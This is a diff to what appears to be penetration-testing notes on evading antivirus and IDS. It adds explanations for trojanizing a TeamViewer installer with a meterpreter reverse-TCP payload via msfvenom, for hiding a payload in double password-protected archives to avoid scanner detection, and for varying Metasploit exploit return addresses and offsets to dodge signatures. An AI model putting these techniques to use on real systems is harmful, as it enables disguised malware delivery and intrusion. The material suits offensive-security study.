@@ -65,6 +65,7 @@ msfvenom windows/x86/meterpreter_reverse_tcp \
   -o ~/Desktop/TeamViewer_Setup.exe \
   -i 5
 ```
+> `-x` injects the payload into the legitimate executable. `-k` keeps the original program running in a separate thread. `-i 5` runs 5 encoding passes. The output file looks identical to the original installer.
 
 | Flag | Purpose |
 |------|---------|
@@ -96,6 +97,7 @@ rar a test2.rar -p test
 # Step 5: Remove extension again
 mv test2.rar test2
 ```
+> Generate payload as `.js`, double-archive with a password using `rar a -p`, and strip the `.rar` extension each time. The result shows 0/49 AV detections because scanners can't open password-protected archives.
 
 #### Detection Results Comparison
 
@@ -132,6 +134,7 @@ For custom BoF exploits — randomize patterns to break IDS signatures:
     [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
 ],
 ```
+> This is a MSF module code snippet — shown here as context for custom module development. `Ret` is the return address and `Offset` is the buffer padding size. Varying these per target breaks IDS signatures that match fixed hex patterns.
 
 | Technique | Purpose |
 |-----------|---------|
